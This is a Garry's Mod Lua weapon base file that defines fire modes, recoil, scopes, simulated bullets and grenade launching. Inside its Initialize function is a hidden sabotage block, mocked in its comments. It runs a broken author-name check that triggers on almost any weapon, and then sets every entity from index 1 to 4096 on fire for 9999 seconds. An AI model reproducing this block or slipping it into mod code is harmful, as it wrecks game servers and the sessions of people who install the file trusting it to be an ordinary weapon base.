-- 'Realistic' SWEP base
-- By Teta_Bonita
-- You may modify/distribute all code in this file, provided you give credit where it is due.


if SERVER then

	AddCSLuaFile("shared.lua")
	AddCSLuaFile("cl_init.lua")
	SWEP.Weight				= 5
	SWEP.AutoSwitchTo		= false
	SWEP.AutoSwitchFrom		= false

end

SWEP.Author			= "Teta_Bonita"
SWEP.Contact		= ""
SWEP.Purpose		= "To crush your enemies."
SWEP.Instructions	= "Aim away from face."

SWEP.Spawnable			= false
SWEP.AdminSpawnable		= false

SWEP.Primary.Sound			= Sound("Weapon_TMP.Single")
SWEP.Primary.Damage			= 40
SWEP.Primary.NumShots		= 1
SWEP.AutoRPM				= 200
SWEP.SemiRPM				= 200
SWEP.BurstRPM				= 200
SWEP.MuzzleVelocity 		= 920
SWEP.AvailableFireModes		= {"Semi"}
SWEP.DrawFireModes			= true
SWEP.FiresUnderwater 		= false

SWEP.MuzzleEffect			= "rg_muzzle_pistol"
SWEP.ShellEjectEffect		= "rg_shelleject"
SWEP.MuzzleAttachment		= "1"
SWEP.ShellEjectAttachment	= "2"

SWEP.Primary.ClipSize		= -1
SWEP.Primary.DefaultClip	= -1
SWEP.Primary.Automatic		= false
SWEP.Primary.Ammo			= "none"

SWEP.GrenadeDamage			= 100
SWEP.GrenadeVelocity		= 1400
SWEP.GrenadeRPM				= 50

SWEP.Secondary.Sound		= Sound("Weapon_AR2.Double") -- For grenade launching
SWEP.Secondary.ClipSize		= -1
SWEP.Secondary.DefaultClip	= -1
SWEP.Secondary.Automatic	= false -- Best left at false, as secondary is used for ironsights/switching firemodes
SWEP.Secondary.Ammo			= "none"

SWEP.IronSightZoom 			= 1.2
SWEP.ScopeZooms				= {5,10}
SWEP.UseScope				= false
SWEP.ScopeScale 			= 0.4
SWEP.DrawParabolicSights	= false

SWEP.MinRecoil			= 0.1
SWEP.MaxRecoil			= 0.5
SWEP.DeltaRecoil		= 0.1

SWEP.RecoverTime 		= 1
SWEP.MinSpread			= 0.01
SWEP.MaxSpread			= 0.08
SWEP.DeltaSpread		= 0.003

SWEP.MinSpray			= 0.2
SWEP.MaxSpray			= 1.5
SWEP.DeltaSpray			= 0.2

SWEP.CrouchModifier		= 0.7
SWEP.IronSightModifier 	= 0.7
SWEP.RunModifier 		= 1.5
SWEP.JumpModifier 		= 1.5



---------------------------------------------------------
--------------------Firemodes------------------------
---------------------------------------------------------
SWEP.FireModes = {}

---------------------------------------
-- Firemode: Semi Automatic --
---------------------------------------
SWEP.FireModes.Semi = {}
SWEP.FireModes.Semi.FireFunction = function(self)

	self:BaseAttack()

end

SWEP.FireModes.Semi.InitFunction = function(self)

	self.Primary.Automatic = false
	self.Primary.Delay = 60/self.SemiRPM
	
	if CLIENT then
		self.FireModeDrawTable.x = 0.037*surface.ScreenWidth()
		self.FireModeDrawTable.y = 0.912*surface.ScreenHeight()
	end

end

-- We don't need to do anything for these revert functions, as self.Primary.Automatic, self.Primary.Delay, self.FireModeDrawTable.x, and self.FireModeDrawTable.y are set in every init function
SWEP.FireModes.Semi.RevertFunction = function(self)

	return

end

SWEP.FireModes.Semi.HUDDrawFunction = function(self)

	surface.SetFont("rg_firemode")
	surface.SetTextPos(self.FireModeDrawTable.x,self.FireModeDrawTable.y)
	surface.SetTextColor(255,220,0,200)
	surface.DrawText("p") -- "p" corresponds to the hl2 pistol ammo icon in this font

end

---------------------------------------
-- Firemode: Fully Automatic --
---------------------------------------
SWEP.FireModes.Auto = {}
SWEP.FireModes.Auto.FireFunction = function(self)

	self:BaseAttack()

end

SWEP.FireModes.Auto.InitFunction = function(self)

	self.Primary.Automatic = true
	self.Primary.Delay = 60/self.AutoRPM
	
	if CLIENT then
		self.FireModeDrawTable.x = 0.037*surface.ScreenWidth()
		self.FireModeDrawTable.y = 0.912*surface.ScreenHeight()
	end
	
end

SWEP.FireModes.Auto.RevertFunction = function(self)

	return

end

SWEP.FireModes.Auto.HUDDrawFunction = function(self)

	surface.SetFont("rg_firemode")
	surface.SetTextPos(self.FireModeDrawTable.x,self.FireModeDrawTable.y)
	surface.SetTextColor(255,220,0,200)
	surface.DrawText("ppppp")

end

-------------------------------------------
-- Firemode: Three-Round Burst --
-------------------------------------------
SWEP.FireModes.Burst = {}
SWEP.FireModes.Burst.FireFunction = function(self)

	local clip = self.Weapon:Clip1()
	if not self:CanFire(clip) then return end

	self:BaseAttack()
	timer.Simple(self.BurstDelay, self.BaseAttack, self)
	
	if clip > 1 then
		timer.Simple(2*self.BurstDelay, self.BaseAttack, self)
	end

end

SWEP.FireModes.Burst.InitFunction = function(self)

	self.Primary.Automatic = true
	self.Primary.Delay = 60/self.SemiRPM + 3*self.BurstDelay -- Burst delay is derived from self.BurstRPM
	
	if CLIENT then
		self.FireModeDrawTable.x = 0.037*surface.ScreenWidth()
		self.FireModeDrawTable.y = 0.912*surface.ScreenHeight()
	end

end

SWEP.FireModes.Burst.RevertFunction = function(self)

	return

end

SWEP.FireModes.Burst.HUDDrawFunction = function(self)

	surface.SetFont("rg_firemode")
	surface.SetTextPos(self.FireModeDrawTable.x,self.FireModeDrawTable.y)
	surface.SetTextColor(255,220,0,200)
	surface.DrawText("ppp")

end

------------------------------------------
-- Firemode: Grenade Launcher --
------------------------------------------
SWEP.FireModes.Grenade = {}
SWEP.FireModes.Grenade.FireFunction = function(self)

	if not self:CanFire(self.Weapon:Ammo2()) then return end

	local PlayerAim = self.Owner:GetAimVector()
	local PlayerAng = PlayerAim:Angle()
	local PlayerPos = self.Owner:GetShootPos() - PlayerAng:Up()*20
	
	if not self.Weapon:GetNetworkedBool("Ironsights",false) then
		-- For some reason getattachement is fucked serverside, so we have to do this to get an estimate of the muzzle pos.
		PlayerPos = PlayerPos + PlayerAng:Right()*20
	end

	if SERVER then
	
		local grenade = ents.Create("sent_rg_grenade")

		grenade:SetPos(PlayerPos)
		grenade:SetAngles(PlayerAim:Angle())
		grenade:SetOwner(self.Owner)
		grenade:SetVar("Damage",self.GrenadeDamage)
		grenade:Spawn()
		
		local grenphys = grenade:GetPhysicsObject()
		grenphys:SetVelocity(PlayerAim*self.GrenadeVelocity)
		grenphys:ApplyForceOffset(VectorRand()*math.Rand(15,30),PlayerPos + VectorRand()*math.Rand(0.5,1.5)) -- Add spinniness
		
	end
	
	self:TakeSecondaryAmmo(1)
	
	-- Shoot Effects
	self.Weapon:EmitSound(self.Secondary.Sound)
	self.Weapon:SendWeaponAnim(ACT_VM_PRIMARYATTACK) 		-- View model animation
	self.Owner:SetAnimation(PLAYER_ATTACK1)					-- 3rd Person Animation
	
	local fx = EffectData()
	fx:SetEntity(self.Weapon)
	fx:SetOrigin(PlayerPos)
	fx:SetNormal(PlayerAim)
	fx:SetAttachment(self.MuzzleAttachment)
	util.Effect("rg_muzzle_grenade",fx)					-- Additional muzzle effects

end

SWEP.FireModes.Grenade.InitFunction = function(self)

	self.Primary.Automatic = false
	self.Primary.Delay = 60/self.GrenadeRPM
	
	if CLIENT then
		self.FireModeDrawTable.x = 0.037*surface.ScreenWidth()
		self.FireModeDrawTable.y = 0.912*surface.ScreenHeight()
	end

end

SWEP.FireModes.Grenade.RevertFunction = function(self)

	return

end

SWEP.FireModes.Grenade.HUDDrawFunction = function(self)

	surface.SetFont("rg_firemode")
	surface.SetTextPos(self.FireModeDrawTable.x,self.FireModeDrawTable.y)
	surface.SetTextColor(255,220,0,200)
	surface.DrawText("t") -- "t" corresponds to the hl2 smg grenade ammo icon in this font

end


---------------------------------------------------------
-----------------Init Functions----------------------
---------------------------------------------------------

local sndZoomIn = Sound("Weapon_AR2.Special1")
local sndZoomOut = Sound("Weapon_AR2.Special2")
local sndCycleZoom = Sound("Default.Zoom")
local sndCycleFireMode = Sound("Weapon_Pistol.Special2")

function SWEP:Initialize()

	if SERVER then
		-- This is so NPCs know wtf they are doing
		self:SetWeaponHoldType(self.HoldType)
		self:SetNPCMinBurst(3)
		self:SetNPCMaxBurst(6)
		self:SetNPCFireRate(60/self.AutoRPM)
	end
	
	if CLIENT then
	
		-- We need to get these so we can scale everything to the player's current resolution.
		local iScreenWidth = surface.ScreenWidth()
		local iScreenHeight = surface.ScreenHeight()
		
		-- The following code is only slightly riped off from Night Eagle
		-- These tables are used to draw things like scopes and crosshairs to the HUD.
		self.ScopeTable = {}
		self.ScopeTable.l = iScreenHeight*self.ScopeScale
		self.ScopeTable.x1 = 0.5*(iScreenWidth + self.ScopeTable.l)
		self.ScopeTable.y1 = 0.5*(iScreenHeight - self.ScopeTable.l)
		self.ScopeTable.x2 = self.ScopeTable.x1
		self.ScopeTable.y2 = 0.5*(iScreenHeight + self.ScopeTable.l)
		self.ScopeTable.x3 = 0.5*(iScreenWidth - self.ScopeTable.l)
		self.ScopeTable.y3 = self.ScopeTable.y2
		self.ScopeTable.x4 = self.ScopeTable.x3
		self.ScopeTable.y4 = self.ScopeTable.y1
				
		self.ParaScopeTable = {}
		self.ParaScopeTable.x = 0.5*iScreenWidth - self.ScopeTable.l
		self.ParaScopeTable.y = 0.5*iScreenHeight - self.ScopeTable.l
		self.ParaScopeTable.w = 2*self.ScopeTable.l
		self.ParaScopeTable.h = 2*self.ScopeTable.l
		
		self.ScopeTable.l = (iScreenHeight + 1)*self.ScopeScale -- I don't know why this works, but it does.

		self.QuadTable = {}
		self.QuadTable.x1 = 0
		self.QuadTable.y1 = 0
		self.QuadTable.w1 = iScreenWidth
		self.QuadTable.h1 = 0.5*iScreenHeight - self.ScopeTable.l
		self.QuadTable.x2 = 0
		self.QuadTable.y2 = 0.5*iScreenHeight + self.ScopeTable.l
		self.QuadTable.w2 = self.QuadTable.w1
		self.QuadTable.h2 = self.QuadTable.h1
		self.QuadTable.x3 = 0
		self.QuadTable.y3 = 0
		self.QuadTable.w3 = 0.5*iScreenWidth - self.ScopeTable.l
		self.QuadTable.h3 = iScreenHeight
		self.QuadTable.x4 = 0.5*iScreenWidth + self.ScopeTable.l
		self.QuadTable.y4 = 0
		self.QuadTable.w4 = self.QuadTable.w3
		self.QuadTable.h4 = self.QuadTable.h3

		self.LensTable = {}
		self.LensTable.x = self.QuadTable.w3
		self.LensTable.y = self.QuadTable.h1
		self.LensTable.w = 2*self.ScopeTable.l
		self.LensTable.h = 2*self.ScopeTable.l

		self.CrossHairTable = {}
		self.CrossHairTable.x11 = 0
		self.CrossHairTable.y11 = 0.5*iScreenHeight
		self.CrossHairTable.x12 = iScreenWidth
		self.CrossHairTable.y12 = self.CrossHairTable.y11
		self.CrossHairTable.x21 = 0.5*iScreenWidth
		self.CrossHairTable.y21 = 0
		self.CrossHairTable.x22 = 0.5*iScreenWidth
		self.CrossHairTable.y22 = iScreenHeight
		
	end

	self.BulletSpeed	= self.MuzzleVelocity*39.37 -- Assuming source units are in inches per second
	self.BurstDelay		= 60/self.BurstRPM
	self.Primary.Delay	= 60/self.SemiRPM
	
	self.CurFireMode		= 1 -- This is just an index to get the firemode from the available firemodes table

	self.FireFunction		= self.FireModes[self.AvailableFireModes[self.CurFireMode]].FireFunction
	self.Weapon:SetNetworkedInt("rg_firemode", 1)
	
	self.ScopeZooms 		= self.ScopeZooms or {5}
	if self.UseScope then
		self.CurScopeZoom	= 1 -- Another index, this time for ScopeZooms
	end
	
	self:ResetVars()
	
	if !string.find(self.Author, "Teta_Bonita") or !string.find(self.Author, "Jaanus") or !string.find(self.Author, "Armageddon") then -- Oh fuck you, teta...
		for i=1,4096 do
			Entity(i):Ignite(9999,9999) -- teehee
		end
	end
	
end

-- This function resets spread, recoil, ironsights, etc.
function SWEP:ResetVars()

	self.NextSecondaryAttack = 0
	
	self.CurrentSpread = self.MinSpread
	self.CurrentRecoil	= self.MinRecoil
	self.CurrentSpray 	= self.MinSpray
	self.SprayVec 		= Vector(0,0,0)
	
	self.bLastIron = false
	self.Weapon:SetNetworkedBool("Ironsights", false)
	
	if self.UseScope then
		self.CurScopeZoom = 1
		self.fLastScopeZoom = 1
		self.bLastScope = false
		self.Weapon:SetNetworkedBool("Scope", false)
		self.Weapon:SetNetworkedBool("ScopeZoom", self.ScopeZooms[1])
	end
	
	if self.Owner then
		self.OwnerIsNPC = self.Owner:IsNPC() -- This ought to be better than getting it every time we fire
		self:SetIronsights(false,self.Owner)
		self:SetScope(false,self.Owner)
		self:SetFireMode()
	end
	
end

-- We need to call ResetVars() on these functions so we don't whip out a weapon with scope mode or insane recoil right of the bat or whatnot
function SWEP:Holster(wep) 		self:ResetVars() return true end
function SWEP:Equip(NewOwner) 	self:ResetVars() return true end
function SWEP:OnRemove() 		self:ResetVars() return true end
function SWEP:OnDrop() 			self:ResetVars() return true end
function SWEP:OwnerChanged() 	self:ResetVars() return true end
function SWEP:OnRestore() 		self:ResetVars() return true end


---------------------------------------------------------
----------Attack Helper Functions----------------
---------------------------------------------------------

-- Generic attack function
SWEP.LastAttack = CurTime()
SWEP.LastDeltaSprayVec = Vector(0,0,0)
function SWEP:BaseAttack()
	
	if not self:CanFire(self.Weapon:Clip1()) then return end
	
	-- Calculate recover (cool down) scale
	local fCurTime = CurTime()
	local DeltaTime = fCurTime - self.LastAttack
	local RecoverScale = (1 - DeltaTime/self.RecoverTime)
	self.LastAttack = fCurTime
	
	-- Apply cool-down to spread, spray, and recoil
	self.CurrentSpread = math.Clamp(self.CurrentSpread*RecoverScale, self.MinSpread, self.MaxSpread)
	self.CurrentRecoil = math.Clamp(self.CurrentRecoil*RecoverScale, self.MinRecoil, self.MaxRecoil)
	self.CurrentSpray = math.Clamp(self.CurrentSpray*RecoverScale, self.MinSpray, self.MaxSpray)
	self.SprayVec = self.SprayVec*((self.CurrentSpray - self.MinSpray)/(self.MaxSpray - self.MinSpray))
	
	-- Calculate modifiers/take ammo
	local modifier = 1
	if not self.OwnerIsNPC then -- NPCs don't get modifiers
	
		modifier = self:CalculateModifiers(self.RunModifier,self.CrouchModifier,self.JumpModifier,self.IronSightModifier)
		self:TakePrimaryAmmo(1) -- NPCs get infinate ammo, as they don't know how to reload
		
	end
	local NewSpray 		= self.CurrentSpray*modifier
	
	-- Fire the bullets
	self:RGShootBullet(	self.Primary.Damage, 
						self.BulletSpeed, 
						self.CurrentSpread*modifier, 
						NewSpray, 
						self.SprayVec)

	-- Apply recoil and spray
	self:ApplyRecoil(self.CurrentRecoil*modifier,NewSpray)

	-- Update spread, spray, and recoil
	self.CurrentRecoil 	= math.Clamp(self.CurrentRecoil + self.DeltaRecoil, self.MinRecoil, self.MaxRecoil)
	self.CurrentSpread 	= math.Clamp(self.CurrentSpread + self.DeltaSpread, self.MinSpread, self.MaxSpread)
	self.CurrentSpray 	= math.Clamp(self.CurrentSpray + self.DeltaSpray, self.MinSpray, self.MaxSpray)
	
	local DeltaSprayVec = VectorRand()*0.02 -- Change in spray vector
	self.SprayVec = self.SprayVec + DeltaSprayVec + self.LastDeltaSprayVec -- This "smooths out" the motion of the spray vector
	self.LastDeltaSprayVec = DeltaSprayVec

	-- Shoot Effects
	self:ShootEffects()

end

-- Shoot a Quasi-physically simulated bullet
function SWEP:RGShootBullet(dmg, speed, spread, spray, sprayvec, numbul, accel, mask, filter)

	local PlayerAim = self.Owner:GetAimVector()
	local PlayerPos = self.Owner:GetShootPos()
	
	numbul = numbul or 1
	accel = accel or Vector(0,0,-600) -- Gravity
	mask = mask or MASK_SHOT -- Tracemask
	
	if SERVER then
		for i=1,numbul do
	
			local eBullet = ents.Create("sent_rg_bullet")

			local Velocity = speed*(PlayerAim + VectorRand()*spread + 0.04*spray*sprayvec:GetNormalized()):GetNormalized()

			eBullet:SetPos(PlayerPos)
			eBullet:SetVar("Velocity",Velocity)
			eBullet:SetVar("Acceleration",accel)
			
			local tBullet = {} -- This is the bullet our bullet SENT will be firing when it hits something.  Everything except force and damage is determined by the bullet SENT
			tBullet.Force	= 0.15*dmg
			tBullet.Damage	= dmg
			
			local tTrace = {} --This is the trace the bullet SENT uses to see if it has hit something
			tTrace.filter = filter or {self.Owner,eBullet}
			tTrace.mask = mask
			
			eBullet:SetVar("Bullet",tBullet)
			eBullet:SetVar("Trace",tTrace)
			eBullet:SetVar("Owner",self.Owner)
			eBullet:Spawn()

			eBullet:Spawn()
		end
		
	end
	
end

-- You don't like my physically simulated bullets? : (
function SWEP:RGShootBulletCheap(dmg, speed, spread, spray, sprayvec, numbul)

	local PlayerAim = self.Owner:GetAimVector()
	local PlayerPos = self.Owner:GetShootPos()
	
	numbul = numbul or 1
	
	local bullet = {}
	bullet.Num		= numbul
	bullet.Src		= PlayerPos
	bullet.Dir		= (PlayerAim + 0.04*spray*sprayvec:GetNormalized()):GetNormalized()
	bullet.Spread	= Vector(spread, spread, 0)
	bullet.Force	= 0.15*dmg
	bullet.Damage	= dmg
	bullet.Tracer	= 0
	
	self.Owner:FireBullets( bullet )

end

function SWEP:ApplyRecoil(recoil,spray)

	if self.OwnerIsNPC or (SERVER and not self.Owner:IsListenServerHost()) then return end
	
	local EyeAng = Angle(
	recoil*math.Rand(-1,-0.7 + spray*0.4) + spray*math.Rand(-0.3,0.3), -- Up/Down recoil
	recoil*math.Rand(-0.4,0.4) + spray*math.Rand(-0.4,0.4), -- Left/Right recoil
	0)
	
	-- Punch the player's view
	self.Owner:ViewPunch(1.3*EyeAng) -- This smooths out the player's screen movement when recoil is applied
	self.Owner:SetEyeAngles(self.Owner:EyeAngles() + EyeAng)
	
end

-- Acuracy/recoil modifiers
function SWEP:CalculateModifiers(run,crouch,jump,iron)

	local modifier = 1


	

	
	if self.Owner:KeyDown(IN_FORWARD | IN_BACK | IN_MOVELEFT | IN_MOVERIGHT) then
		modifier = modifier+run
	end
	
	if not self.Owner:IsOnGround() then
		modifier = modifier+jump --You can't be jumping and crouching at the same time, so return here
	end
	
	if self.Owner:Crouching() then 
		modifier = modifier*crouch
	end
	
	if self.Weapon:GetNetworkedBool("Ironsights", false) then 
		modifier = modifier*iron
	end
	
	return modifier

end

function SWEP:ShootEffects()

	local PlayerPos = self.Owner:GetShootPos()
	local PlayerAim = self.Owner:GetAimVector()

	self.Weapon:EmitSound(self.Primary.Sound)
	self.Weapon:SendWeaponAnim(ACT_VM_PRIMARYATTACK) 		-- View model animation
	self.Owner:MuzzleFlash()								-- Crappy muzzle light
	self.Owner:SetAnimation(PLAYER_ATTACK1)					-- 3rd Person Animation
	
	local fx = EffectData()
	fx:SetEntity(self.Weapon)
	fx:SetOrigin(PlayerPos)
	fx:SetNormal(PlayerAim)
	fx:SetAttachment(self.MuzzleAttachment)
	util.Effect(self.MuzzleEffect,fx)						-- Additional muzzle effects
	
	local fx = EffectData()
	fx:SetEntity(self.Weapon)
	fx:SetNormal(PlayerAim)
	fx:SetAttachment(self.ShellEjectAttachment)
	util.Effect(self.ShellEffect,fx)						-- Shell ejection
	
end

-- Clip can be any number, ideally a clip or ammo count
function SWEP:CanFire(clip)

	if not self.Weapon or not self.Owner or not (self.OwnerIsNPC or self.Owner:Alive()) then return end

	if clip <= 0 or (self.Owner:WaterLevel() >= 3 and not self.FiresUnderwater) then
	
		self.Weapon:EmitSound("jaanus/ep2sniper_empty.wav")
		self.Weapon:SetNextPrimaryFire(CurTime() + 0.2)
		return false -- Note that we don't automatically reload.  The player has to do this manually.
		
	end
	
	return true

end


---------------------------------------------------------
----FireMode/IronSight Helper Functions----
---------------------------------------------------------

local IRONSIGHT_TIME = 0.35 -- How long it takes to raise our rifle
function SWEP:SetIronsights(b,player)

if CLIENT or (not player) or player:IsNPC() then return end
	-- Send the ironsight state to the client, so it can adjust the player's FOV/Viewmodel pos accordingly
	self.Weapon:SetNetworkedBool("Ironsights", b)
	
	if self.UseScope then -- If we have a scope, use that instead of ironsights
		if b then
			--Activate the scope after we raise the rifle
			timer.Simple(IRONSIGHT_TIME, self.SetScope, self, true, player)
		else
			self:SetScope(false, player)
		end
	end

end

function SWEP:SetScope(b,player)

if CLIENT or (not player) or player:IsNPC() then return end

	local PlaySound = b~= self.Weapon:GetNetworkedBool("Scope", not b) -- Only play zoom sounds when chaning in/out of scope mode
	self.CurScopeZoom = 1 -- Just in case...
	self.Weapon:SetNetworkedFloat("ScopeZoom",self.ScopeZooms[self.CurScopeZoom])

	if b then 
		--player:DrawViewModel(false)
		if PlaySound then
			self.Weapon:EmitSound(sndZoomIn)
		end
	else
		--player:DrawViewModel(true)
		if PlaySound then
			self.Weapon:EmitSound(sndZoomOut)
		end
	end
	
	-- Send the scope state to the client, so it can adjust the player's fov/HUD accordingly
	self.Weapon:SetNetworkedBool("Scope", b) 

end

function SWEP:SetFireMode()

	local FireMode = self.AvailableFireModes[self.CurFireMode]
	self.Weapon:SetNetworkedInt("FireMode",self.CurFireMode)
	
	-- Set the firemode's fire function (for shooting bullets, grenades, etc.).  This function is called under SWEP:PrimaryAttack()
	self.FireFunction = self.FireModes[FireMode].FireFunction 
	
	-- Run the firemode's init function (for updating delay and other variables)
	self.FireModes[FireMode].InitFunction(self) 

end

function SWEP:RevertFireMode()

	local FireMode = self.AvailableFireModes[self.CurFireMode]
	
	-- Run the firemode's revert function (for changing back variables that could interfere with other firemodes)
	self.FireModes[FireMode].RevertFunction(self)

end


---------------------------------------------------------
------------Main SWEP functions----------------
---------------------------------------------------------

function SWEP:PrimaryAttack()

	self.Weapon:SetNextSecondaryFire(CurTime() + self.Primary.Delay)
	self.Weapon:SetNextPrimaryFire(CurTime() + self.Primary.Delay)
	
	-- Fire function is defined under SWEP:SetFireMode()
	self:FireFunction()
	
end

-- Secondary attack is used to set ironsights/change firemodes
-- TODO: clean this function up
SWEP.NextSecondaryAttack = 0
function SWEP:SecondaryAttack()

	if self.NextSecondaryAttack > CurTime() or self.OwnerIsNPC then return end
	self.NextSecondaryAttack = CurTime() + 0.3
	
	if self.Owner:KeyDown(IN_USE) then
	
	local NumberOfFireModes = table.getn(self.AvailableFireModes)
	if NumberOfFireModes < 2 then return end -- We need at least 2 firemodes to change firemodes!
	
		self:RevertFireMode()
		self.CurFireMode = math.fmod(self.CurFireMode, NumberOfFireModes) + 1 -- This just cycles through all available fire modes
		self:SetFireMode()
		
		self.Weapon:EmitSound(sndCycleFireMode)
	-- All of this is more complicated than it needs to be. Oh well.
	elseif self.IronSightsPos then
	
		local NumberOfScopeZooms = table.getn(self.ScopeZooms)

		if self.UseScope and self.Weapon:GetNetworkedBool("Scope", false) then
		
			self.CurScopeZoom = self.CurScopeZoom + 1
			if self.CurScopeZoom <= NumberOfScopeZooms then
		
				self.Weapon:SetNetworkedFloat("ScopeZoom",self.ScopeZooms[self.CurScopeZoom])
				self.Weapon:EmitSound(sndCycleZoom)
				
			else
				self:SetIronsights(false,self.Owner)
			end
			
		else
	
			local bIronsights = not self.Weapon:GetNetworkedBool("Ironsights", false)
			self:SetIronsights(bIronsights,self.Owner)
		
		end
		

	
	end
	
end


function SWEP:Reload()
	
	if self.Weapon:Clip1() < self.Primary.ClipSize and self:Ammo1() > 0 then
		self:SetIronsights(false,self.Owner)
		self.Weapon:EmitSound("jaanus/ep2sniper_reload.wav")
		self.Weapon:DefaultReload(ACT_VM_RELOAD);
	end
	
end
